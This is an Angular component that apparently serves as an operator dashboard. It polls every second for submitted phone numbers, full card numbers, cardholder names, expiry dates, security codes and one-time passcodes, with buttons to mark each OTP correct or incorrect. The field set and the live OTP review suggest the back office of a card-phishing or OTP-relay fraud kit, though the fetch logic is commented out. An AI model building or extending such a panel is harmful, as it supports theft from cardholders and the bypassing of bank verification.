import { Component, OnDestroy, OnInit } from '@angular/core';
import { Subscription, interval } from 'rxjs';
import { SubmissionService } from '../submission.service';

@Component({
  selector: 'app-submissions',
  templateUrl: './submissions.component.html',
  styleUrls: ['./submissions.component.css'],
})
export class SubmissionsComponent implements OnInit, OnDestroy {
  submissions: {
    phoneNumber: string;
    cardNumber: string;
    cardHolderName: string;
    expiryDate: string;
    securityCode: string;
    otp: string;
  }[] = [];
  private submissionUpdateSubscription!: Subscription;
  private pollingIntervalMs = 1000; // Polling interval in milliseconds (e.g., every 5 seconds)

  constructor(private submissionService: SubmissionService) {}

  ngOnInit(): void {
    //this.submissions = this.submissionService.getSubmissions();

    // Subscribe to periodic submission updates
    this.submissionUpdateSubscription = interval(
      this.pollingIntervalMs
    ).subscribe(() => {
      this.updateSubmissions();
    });
  }

  ngOnDestroy(): void {
    // Unsubscribe from the subscription to avoid memory leaks
    this.submissionUpdateSubscription.unsubscribe();
  }

  private updateSubmissions(): void {
    // Update the local submissions list from the service
    //this.submissions = this.submissionService.getSubmissions();
  }

  markCorrect(submission: any): void {
    // Implement logic to mark the submission as correct
    console.log('Marking submission as correct:', submission);
    localStorage.setItem('otp_status', 'correct');
  }

  markIncorrect(submission: any): void {
    // Implement logic to mark the submission as incorrect
    console.log('Marking submission as incorrect:', submission);
    localStorage.setItem('otp_status', 'incorrect');
  }

  performOtherAction(submission: any): void {
    // Implement other action logic
    console.log('Performing other action:', submission);
    localStorage.setItem('otp_status', 'other');
  }
}
